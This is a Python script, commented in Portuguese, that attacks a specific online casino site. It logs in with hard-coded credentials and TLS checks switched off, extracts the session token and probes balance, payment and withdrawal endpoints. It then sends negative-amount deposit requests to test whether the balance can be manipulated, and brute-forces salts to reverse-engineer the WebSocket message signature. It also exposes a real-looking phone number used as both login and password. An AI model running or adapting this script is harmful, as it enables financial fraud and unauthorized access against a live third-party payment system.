"""
Inspeciona a resposta completa do login para encontrar
o token correto do /prod-api/ e o WebSocket.
"""
import urllib.request, ssl, json, uuid

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE  = "https://ds.amizade777.com"
PKG   = "com.slots.big"
PHONE = "21998498419"
PWD   = "21998498419"
DID   = "0beb614f-8838-43ef-00fc-0029f7d5d20f"

def post(path, data, token=None):
    body = json.dumps(data).encode()
    h = {
        "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Accept":       "*/*",
        "Origin":       BASE,
        "Referer":      BASE + "/",
    }
    if token:
        h["token"] = token
    try:
        r = urllib.request.Request(BASE + path, data=body, headers=h, method="POST")
        with urllib.request.urlopen(r, timeout=15, context=ctx) as resp:
            raw = resp.read(16384).decode("utf-8","ignore")
            return resp.status, dict(resp.headers), raw
    except urllib.error.HTTPError as e:
        raw = e.read(8192).decode("utf-8","ignore") if e.fp else ""
        return e.code, dict(e.headers) if e.headers else {}, raw
    except Exception as ex:
        return 0, {}, str(ex)

def get(path, token=None):
    h = {
        "User-Agent": "Mozilla/5.0",
        "Accept":     "application/json, */*",
        "Origin":     BASE,
        "Referer":    BASE + "/",
    }
    if token:
        h["token"] = token
    try:
        r = urllib.request.Request(BASE + path, headers=h)
        with urllib.request.urlopen(r, timeout=15, context=ctx) as resp:
            raw = resp.read(16384).decode("utf-8","ignore")
            return resp.status, dict(resp.headers), raw
    except urllib.error.HTTPError as e:
        raw = e.read(4096).decode("utf-8","ignore") if e.fp else ""
        return e.code, {}, raw
    except Exception as ex:
        return 0, {}, str(ex)

# ── LOGIN ───────────────────────────────────────────────
print("=" * 60)
print("LOGIN — RESPOSTA COMPLETA")
print("=" * 60)

st, hdrs, raw = post("/prod-api/player/sign-in", {
    "appChannel": "pc", "appPackageName": PKG,
    "deviceId": DID, "deviceModel": "WEB",
    "deviceVersion": "WEB", "appVersion": "1.0.0",
    "sysTimezone": None, "sysLanguage": None,
    "phone": PHONE, "password": PWD,
})

print(f"HTTP status: {st}")
print("\n--- HEADERS DA RESPOSTA ---")
for k, v in hdrs.items():
    print(f"  {k}: {v}")

print("\n--- BODY COMPLETO ---")
try:
    body = json.loads(raw)
    print(json.dumps(body, ensure_ascii=False, indent=2))
    TOKEN = body.get("data", {}).get("token") or body.get("token")
    print(f"\nToken extraído: {TOKEN}")
except:
    print(raw[:2000])
    TOKEN = None

if not TOKEN:
    print("Token não encontrado no body — procurando nos headers...")
    for k, v in hdrs.items():
        if "token" in k.lower() or "auth" in k.lower():
            print(f"  Header potencial: {k}: {v}")
            TOKEN = v

print("\n" + "=" * 60)
print("TESTANDO O TOKEN NOS DOIS BACKENDS")
print("=" * 60)

if TOKEN:
    print(f"Token: {TOKEN}\n")
    for path in [
        "/prod-api/pay-service/recharge",
        "/prod-api/payment/balance-less",
        "/prod-api/player/info",
        "/japi/user/balance/querySimpleBalance",
        "/prod-api/vip/info",
        "/prod-api/pay-service/withdraw-limit",
    ]:
        st2, _, raw2 = get(path, TOKEN)
        try:
            b = json.loads(raw2)
            code = b.get("code","?")
            msg  = b.get("msg","")
            data = b.get("data","")
            flag = " *** FUNCIONA! ***" if code == 200 else ""
            print(f"  [{st2}] {path} -> code={code} msg={msg!r}{flag}")
            if code == 200 and data:
                print(f"    DATA: {json.dumps(data, ensure_ascii=False)[:300]}")
        except:
            print(f"  [{st2}] {path} -> {raw2[:80]}")

# ── Testar com POST no /prod-api usando o token ──────────
print("\n" + "=" * 60)
print("TESTE DEPÓSITO NEGATIVO COM TOKEN FRESCO")
print("=" * 60)
if TOKEN:
    for amount in [-100, -1, 0, 1]:
        st2, _, raw2 = post("/prod-api/pay-service/recharge", {
            "amount": amount,
            "appPackageName": PKG,
            "deviceId": DID,
        }, token=TOKEN)
        try:
            b = json.loads(raw2)
            code = b.get("code","?")
            msg  = b.get("msg","")
            flag = " *** ACEITO! VULNERÁVEL! ***" if code == 200 else ""
            print(f"  amount={amount} -> HTTP={st2} code={code} msg={msg!r}{flag}")
            if code == 200:
                print(f"    DATA: {json.dumps(b.get('data',{}), ensure_ascii=False)[:400]}")
        except:
            print(f"  amount={amount} -> HTTP={st2} {raw2[:80]}")

# ── WebSocket sign token ─────────────────────────────────
print("\n" + "=" * 60)
print("NOTA SOBRE O WEBSOCKET")
print("=" * 60)
print("  WebSocket: wss://ds.amizade777.com/websocket6")
print("  Envia heartbeats com msgtype=3 a cada 10s")
print("  Campos: time (timestamp) + sign (hash MD5/SHA?)")
print("  O 'sign' muda a cada mensagem — pode ser HMAC ou MD5(time+secret)")
print("  Analisando padrão dos signs capturados na imagem:")
signs_capturados = [
    (1780878839, "4088713d3664b774f3a5692e5e80c2f4"),
    (1780878849, "1bb4bdf0d38accdfa96eb4b85dc8babe"),
    (1780878859, "6d948156b4fc6dd6d3d8b8a3d6289072"),
    (1780878869, "0a2219c16e37a7ff7b902c4872b5ac2c"),
    (1780878879, "783fc6abda9820a3b8c35c7764b8d2c4"),
    (1780878889, "75291a2d65163edd20879fc0dd3cc3ae"),
    (1780878899, "40496f4f4a053432bb263d5b49c41cae"),
    (1780878909, "7e106dfedb73a0cb11d3325c39f637f9"),
]
print("\n  Signs capturados do WebSocket:")
for ts, sign in signs_capturados:
    print(f"    time={ts}  sign={sign}")

# Tentar descobrir o padrão (MD5 de algo?)
import hashlib
print("\n  Tentando reproduzir o sign...")
ts_test, sign_test = signs_capturados[0]
# Tentar MD5(time)
md5_time = hashlib.md5(str(ts_test).encode()).hexdigest()
print(f"  MD5('{ts_test}') = {md5_time}  {'*** MATCH ***' if md5_time == sign_test else 'sem match'}")
# Tentar MD5(time + phone)
md5_time_phone = hashlib.md5(f"{ts_test}{PHONE}".encode()).hexdigest()
print(f"  MD5('{ts_test}{PHONE}') = {md5_time_phone}  {'*** MATCH ***' if md5_time_phone == sign_test else 'sem match'}")
# Tentar MD5(time + pkg)
md5_time_pkg = hashlib.md5(f"{ts_test}{PKG}".encode()).hexdigest()
print(f"  MD5('{ts_test}{PKG}') = {md5_time_pkg}  {'*** MATCH ***' if md5_time_pkg == sign_test else 'sem match'}")
# Tentar MD5 de apenas time como int
for salt in ["", "amizade777", "com.slots.big", "slots", "casino", "pc", PHONE, DID, "secret", "key", "123456"]:
    candidate = hashlib.md5(f"{ts_test}{salt}".encode()).hexdigest()
    if candidate == sign_test:
        print(f"  *** MATCH! MD5('{ts_test}{salt}') = {candidate}")

print("\nConcluído.")
